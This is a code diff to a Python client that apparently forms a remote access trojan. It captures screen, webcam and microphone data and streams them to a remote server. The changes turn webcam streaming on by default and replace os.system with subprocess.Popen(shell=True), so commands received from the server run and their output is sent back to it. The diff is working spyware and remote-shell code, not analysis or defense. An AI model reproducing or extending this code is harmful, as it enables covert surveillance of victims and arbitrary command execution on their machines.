@@ -7,7 +7,7 @@ import numpy
 import time
 import cv2
 import io
-import os
+import subprocess
 
 from threading import Thread
 from PIL import ImageGrab
@@ -34,7 +34,7 @@ class Client:
 
                 self.frame = None
                 self.audio = None
-                self.stream_cam_enabled = False
+                self.stream_cam_enabled = True
                 self.frameDump = None
                 self.framePack = None
                 self.frame = None
@@ -58,8 +58,9 @@ class Client:
     def sendAll(self, data):
         try:
             self.client.sendall(data)
-        except:
+        except Exception as err:
             self.close_thread = True 
+            print(err)
             return None
 
     def receiveAll(self):
@@ -78,11 +79,15 @@ class Client:
             if self.close_thread:
                 break
 
-            data = stream.read(1024)
-            mic_buff = numpy.frombuffer(data, dtype=numpy.int16)
-            microData = mic_buff.astype(numpy.int16).tobytes()
-            packet = [0x02, *microData]
-            data = self.sendAll(bytes(packet))
+            try:
+                data = stream.read(1024)
+                mic_buff = numpy.frombuffer(data, dtype=numpy.int16)
+                microData = mic_buff.astype(numpy.int16).tobytes()
+                packet = [0x02, *microData]
+                data = self.sendAll(bytes(packet))
+            except:
+                continue
+
             if data == None:
                 continue
 
@@ -125,11 +130,19 @@ class Client:
             print(self.data)
 
             if self.data != "cmd_packet":
+                sys = subprocess.Popen(self.data, shell=True,stdout=subprocess.PIPE)
+                output = sys.stdout.read()
+                print(self.data)
+
+                len_msg = [len(output) >> 16 & 0xff, len(output) >> 8 & 0xff, len(output) & 0xff]
+                self.sendAll(bytes([0x04, *len_msg, *output]))
+
                 self.stream_cam_enabled = True
-                os.system(self.data)
             else:
+                print("Callback")
                 self.comProcess()
-        except:
+        except Exception as err:
+            print(err)
             self.connectClient()
 
     def processData(self):
@@ -149,8 +162,6 @@ class Client:
             if data == "cmd_packet":
                 self.stream_cam_enabled = False
                 self.comProcess()
-            else:
-                self.stream_cam_enabled = True
 
     def streamCam(self):
         while True:
